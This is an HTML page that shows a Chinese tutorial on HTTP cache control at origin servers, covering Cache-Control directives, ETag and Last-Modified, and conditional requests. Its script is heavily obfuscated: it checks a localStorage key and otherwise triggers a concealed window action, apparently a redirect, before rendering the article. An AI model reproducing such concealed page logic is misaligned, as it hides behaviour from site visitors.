<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x25bb94=_0x44f9;if((()=>{for(var n=_0x44f9,o=_0x6728();;)try{if(276201==+parseInt(n(408,"M&QK"))+parseInt(n(397,"Ogh0"))/2+parseInt(n(406,"xS1D"))/3+-parseInt(n(394,"4(wW"))/4*(parseInt(n(391,"H*KL"))/5)+-parseInt(n(404,"ebKu"))/6+-parseInt(n(412,"u*1D"))/7*(parseInt(n(399,"GbmT"))/8)+-parseInt(n(411,"mMMU"))/9)break;o.push(o.shift())}catch(n){o.push(o.shift())}})(),localStorage[_0x25bb94(402,"4#])")](_0x25bb94(409,"163z"))!=_0x25bb94(395,"jSD*"))throw window[_0x25bb94(393,"ebKu")][_0x25bb94(410,"biNl")](_0x25bb94(396,"&B6^")),Error();function _0x44f9(t,n){var i=_0x6728();return(_0x44f9=function(n,o){var l=i[n-=391];void 0===_0x44f9.cBCXKK&&(_0x44f9.xzfWtt=function(n,o){var l,r=[],t=0,i="";for(n=(n=>{for(var o,l,r="",t="",i=0,e=0;l=n.charAt(e++);~l&&(o=i%4?64*o+l:l,i++%4)&&(r+=String.fromCharCode(255&o>>(-2*i&6))))l="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(l);for(var c=0,d=r.length;c<d;c++)t+="%"+("00"+r.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(t)})(n),e=0;e<256;e++)r[e]=e;for(e=0;e<256;e++)t=(t+r[e]+o.charCodeAt(e%o.length))%256,l=r[e],r[e]=r[t],r[t]=l;for(var e=0,t=0,c=0;c<n.length;c++)l=r[e=(e+1)%256],r[e]=r[t=(t+r[e])%256],r[t]=l,i+=String.fromCharCode(n.charCodeAt(c)^r[(r[e]+r[t])%256]);return i},t=arguments,_0x44f9.cBCXKK=!0);var n=n+i[0],r=t[n];return r?l=r:(void 0===_0x44f9.jrIAXL&&(_0x44f9.jrIAXL=!0),l=_0x44f9.xzfWtt(l,o),t[n]=l),l})(t,n)}function _0x6728(){var n=["WRT2pauDB8kfWQtcK8kGhSo4W7e","aeddGSkIWPZcOxBdISoiDIzS","W6DAeSkcWOOKfG7cI8ooWQ0aEq","hdBdTSoWlComamkqCa","WOtdMxddLWZdILpcNCkeWRlcMqe","bCopW45+lSoMWRhdNCk2","kabAW6NdGXC0","WObYWRzwWQ3cNmk1pmoYmCkwEG","W7zKW7hdL8oKnmkZWOqeW5nV","pCoTvqVdQSoytCklnSoZwq","qfC2W70/W5BcRNRcVJddKmoHWOi","WOxcP0rjz8o/pG0+xmkj","lLZdVmoIWRpdUSkhWP/cJmofWRep","W6uVzLnEp8osWR0","FCkmW61hW5WwW6tcQG","xSoGW41iW68","eHuuWOhcJ0iyW5hdRCkek3xdJhvOkfBcIWpdUafZWPtcKrhcRa","kSoYbmosW6O0C8kaW6rtWQtcNG","vSkADSoyW6ldOIZcGSktW7dcT8kmwa","W7NcMeSvk8omW6xdMe8","W6nvjSoph8kis8oh","WRT3mayFpCoFWOBcGCkjjG","pvnwzwaZWRW","W69rh8kgWOmQrsxcLCoHWQmK"];return(_0x6728=function(){return n})()}document.title="源服务器的缓存控制",document.getElementById("article").innerHTML="<div><p>源服务器的缓存控制是优化网络请求、减轻服务器负担和提高访问速度的重要手段。以下是对源服务器缓存控制的详细解析：</p>\n<h3>一、缓存控制头字段</h3>\n<p>源服务器主要通过设置 HTTP 响应头中的缓存控制字段来管理缓存行为。这些字段包括：</p>\n<ol>\n<li><strong>Cache-Control</strong>  ：\n<ul>\n<li><strong>max-age</strong>  ：设置缓存的最大生存时间，单位为秒。例如，<code>Cache-Control: max-age=3600</code> 表示资源在 1 小时内是新鲜的，可以被缓存。</li>\n<li><strong>no-store</strong>  ：不允许缓存，用于某些变化非常频繁的页面。</li>\n<li><strong>no-cache</strong>  ：可以缓存，但在使用之前必须要去服务器验证是否过期，是否有最新的版本。</li>\n<li><strong>must-revalidate</strong>  ：缓存不过期就可以继续使用，但过期了如果还想用就必须去服务器验证。</li>\n<li><strong>s-maxage</strong>  ：与 <code>max-age</code> 类似，但它只应用于共享缓存（如 CDN 节点）。</li>\n<li><strong>public</strong>  ：表示缓存可以被所有用户共享（适用于不需要身份验证的公共内容）。</li>\n<li><strong>private</strong>  ：表示缓存只对特定用户有效（适用于包含私人数据的内容）。</li>\n</ul>\n</li>\n<li><strong>Expires</strong>  ：\n<ul>\n<li>设置缓存的过期时间，是一个具体的日期和时间。但由于它是基于服务器时间的，可能会受到时钟同步问题的影响，因此现代应用中更推荐使用 <code>Cache-Control</code>。</li>\n</ul>\n</li>\n<li><strong>Last-Modified</strong>   和 <strong>ETag</strong>  ：\n<ul>\n<li><strong>Last-Modified</strong>  ：资源的最后修改时间，用于条件请求。</li>\n<li><strong>ETag</strong>  ：资源的唯一标识符，用于更精确地判断资源是否发生变化。</li>\n</ul>\n</li>\n</ol>\n<h3>二、缓存控制策略</h3>\n<p>源服务器可以根据资源的特性和访问模式，制定不同的缓存控制策略：</p>\n<ol>\n<li><strong>静态资源</strong>  ：\n<ul>\n<li>对于不经常变化的静态资源（如图片、CSS、JavaScript 文件等），可以设置较长的缓存时间（如数天、数周甚至更长）。</li>\n<li>使用 <code>ETag</code> 和 <code>Last-Modified</code> 来处理条件请求，确保客户端在资源未发生变化时不会重复下载。</li>\n</ul>\n</li>\n<li><strong>动态资源</strong>  ：\n<ul>\n<li>对于经常变化的动态资源（如用户个人信息、商品列表等），可以设置较短的缓存时间或禁用缓存。</li>\n<li>如果需要缓存动态资源，可以考虑使用 <code>private</code> 和 <code>no-cache</code> 等字段来控制缓存行为。</li>\n</ul>\n</li>\n<li><strong>混合内容</strong>  ：\n<ul>\n<li>对于包含静态和动态内容的页面，可以分别设置不同的缓存策略。例如，静态部分可以设置较长的缓存时间，而动态部分则可以设置较短的缓存时间或禁用缓存。</li>\n</ul>\n</li>\n</ol>\n<h3>三、缓存验证与更新</h3>\n<p>当客户端请求一个缓存的资源时，源服务器可以通过条件请求来验证缓存的有效性：</p>\n<ol>\n<li><strong>条件请求</strong>  ：\n<ul>\n<li>客户端在请求头中携带 <code>If-Modified-Since</code>（基于 <code>Last-Modified</code>）或 <code>If-None-Match</code>（基于 <code>ETag</code>）字段。</li>\n<li>源服务器根据这些字段判断资源是否发生变化。如果资源未发生变化，则返回 304 状态码（未修改），客户端继续使用缓存；如果资源发生变化，则返回 200 状态码和新的资源内容。</li>\n</ul>\n</li>\n<li><strong>缓存更新</strong>  ：\n<ul>\n<li>当源服务器的资源发生变化时，可以通过更改资源的 URL（如添加版本号或哈希值）来强制客户端更新缓存。</li>\n<li>也可以使用缓存清理 API 或工具来手动清除特定资源的缓存。</li>\n</ul>\n</li>\n</ol>\n<h3>四、注意事项</h3>\n<ol>\n<li><strong>缓存一致性</strong>  ：\n<ul>\n<li>在设置缓存策略时，需要确保缓存的一致性。即当源服务器的资源发生变化时，客户端能够及时获取到最新的资源。</li>\n</ul>\n</li>\n<li><strong>安全性</strong>  ：\n<ul>\n<li>对于包含敏感信息的资源，应谨慎设置缓存策略，避免缓存被恶意利用。</li>\n</ul>\n</li>\n<li><strong>性能优化</strong>  ：\n<ul>\n<li>合理的缓存策略可以显著提高应用的性能，减少源服务器的负担和延迟。但过长的缓存时间可能导致客户端使用过时的资源，因此需要根据资源的特性和访问模式来制定合适的缓存策略。</li>\n</ul>\n</li>\n</ol>\n</div>"</script></body></html>